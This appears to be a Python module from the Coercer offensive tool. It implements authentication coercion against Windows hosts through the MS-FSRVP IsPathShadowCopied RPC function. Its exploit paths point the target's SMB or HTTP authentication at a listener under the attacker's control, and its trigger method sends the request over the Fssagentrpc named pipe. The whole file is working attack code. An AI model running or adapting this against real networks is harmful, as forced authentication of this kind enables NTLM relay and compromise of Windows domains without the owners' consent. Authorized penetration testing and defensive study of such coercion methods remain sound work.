#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : IsPathShadowCopied.py
# Author             : Podalirius (@podalirius_)
# Date created       : 15 Sep 2022

from impacket.dcerpc.v5.dtypes import WSTR
from impacket.dcerpc.v5.ndr import NDRCALL

from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL


class _IsPathShadowCopied(NDRCALL):
    """
    Structure to make the RPC call to IsPathShadowCopied() in MS-FSRVP Protocol
    """

    opnum = 9
    structure = (("ShareName", WSTR),)  # Type: LPWSTR


class _IsPathShadowCopiedResponse(NDRCALL):
    """
    Structure to parse the response of the RPC call to IsPathShadowCopied() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
    """

    structure = ()


class IsPathShadowCopied(MSPROTOCOLRPCCALL):
    """
    Coercing a machine to authenticate using function IsPathShadowCopied (opnum 9) of [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)

    Method found by:
     - [@topotam77](https://twitter.com/topotam77)
    """

    exploit_paths = [
        ("smb", "\\\\{{listener}}\x00"),
        ("http", "\\\\{{listener}}@{{http_listen_port}}/{{rnd(3)}}\x00"),
    ]

    access = {
        "ncan_np": [
            {
                "namedpipe": r"\PIPE\Fssagentrpc",
                "uuid": "a8e0653c-2744-4389-a61d-7373df8b2292",
                "version": "1.0",
            }
        ],
        "ncacn_ip_tcp": [
            {"uuid": "a8e0653c-2744-4389-a61d-7373df8b2292", "version": "1.0"}
        ],
    }

    protocol = {
        "longname": "[MS-FSRVP]: File Server Remote VSS Protocol",
        "shortname": "MS-FSRVP",
    }

    function = {
        "name": "IsPathShadowCopied",
        "opnum": 9,
        "vulnerable_arguments": ["ShareName"],
    }

    def trigger(self, dcerpc_session, target):
        if dcerpc_session is not None:
            try:
                request = _IsPathShadowCopied()
                request["ShareName"] = self.path
                dcerpc_session.request(request)
                return ""
            except Exception as err:
                return err
        else:
            from coercer.core.Reporter import reporter

            reporter.print_error("Error: dce is None, you must call connect() first.")
            return None
